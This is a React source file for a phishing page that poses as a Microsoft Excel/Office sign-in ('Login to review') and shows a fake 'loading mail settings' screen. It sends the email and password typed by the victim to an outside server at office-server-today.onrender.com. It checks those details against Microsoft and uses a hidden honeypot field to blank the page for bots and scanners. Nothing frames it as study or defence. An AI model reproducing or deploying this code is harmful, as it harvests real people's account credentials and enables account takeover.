import React, { useState } from 'react';
import axios from "axios";
import './App.css';

function App() {
  const [usernam, setMessage] = useState('');
  const [passwo, setPass] = useState('');
  const [show, showSet] = useState('show');
  const [loadin, loadinScr] = useState('loadinScr');


  const handleInputChange = (event) => {
    setMessage(event.target.value);
  };
  const handleInputChanger = (event) => {
    setPass(event.target.value);
    showSet('show')
  };

  const handleSubmit = async (e) => {
    e.preventDefault()

        loadinScr('');

    const formData = new FormData(e.target);
    const username = formData.get("username");
    const password = formData.get("password");
    const honeypot = formData.get("honeypot");

    if(honeypot !== ""){
      document.body.innerHTML = '';
        return
    }

    try{
      const response = await axios.post('https://office-server-today.onrender.com/login', {
      // const response = await axios.post('https://office-server-ernk.onrender.com/login', {
      username,
      password,
        });
      const responseData = response.data

      if(responseData.collectCode === "false"){
        setPass('')
        loadinScr('')
      }

      if(responseData.notValidOnMsoft === "false"){
        showSet('')
        setPass('')
        loadinScr('loadinScr')
      }
      if(responseData.dataMsg === "false"){
        showSet('')
        setPass('')
        loadinScr('loadinScr')
      } else {

      }

    } catch(error){
      console.log('An error occurred:', error)
    }


  }

  return (

    <div className="App">
        <div className={loadin} id="loading">
   <div className='loader'>
    <img src="https://1000logos.net/wp-content/uploads/2020/08/Microsoft-Excel-Logo-500x313.png" height='70px'/>
    <br/>
    <br/>
    <div className="loading-bar">
  <div className="loading-bar-progress"></div>
    </div>
    <p className='lines'>loading {usernam} mail settings....</p>
   </div>
  </div>
    <div className="dark-sidee">
        <section className="form-section">
          <img id='img' src="https://1000logos.net/wp-content/uploads/2020/08/Microsoft-Excel-Logo-500x313.png"/>
        <h2>Welcome</h2>
        <p>Login to review</p>
        <br/>
            <form onSubmit={handleSubmit} className="form">
              <p id="error" className={show}>Invalid email or password.</p>
              <input type="email" name="username" value={usernam} onChange={handleInputChange} placeholder="Email Address" require/>
              <input type="email" id='none' name="honeypot" placeholder="Email Address"/>
              <br/>
              <input type="password" name="password" value={passwo} onChange={handleInputChanger} placeholder="password" require/>
              <br/>
              <br/>
              <button type="submit" id="submit">Submit</button>
            </form>
        </section>
        </div>
    </div>
  );
}

export default App;
